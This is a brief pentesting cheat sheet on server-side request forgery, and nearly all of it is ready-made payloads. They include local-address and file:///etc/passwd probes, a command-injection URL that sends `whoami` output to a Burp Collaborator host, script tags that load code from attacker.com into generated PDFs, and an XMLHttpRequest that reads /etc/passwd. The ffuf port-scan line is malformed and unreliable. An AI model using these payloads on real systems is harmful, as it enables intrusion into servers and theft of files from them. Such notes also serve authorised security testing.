---
description: >-
  Getting the server to make a request and potentially access something I can’t
  access otherwise is known as a server-side request forgery (SSRF) exploit.
---

# SSRF

#### Detect

```bash
# Check with
http://127.0.0.1/
file:///etc/passwd

# FFUF for open ports
ffuf -u 127:0.0.1:FUZZ -w numbers.lst 

# SSRF with command injection
url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`

```

#### SSRF in dynamic .pdf's using XSS

```bash
# Write script
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>

# Read files
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```
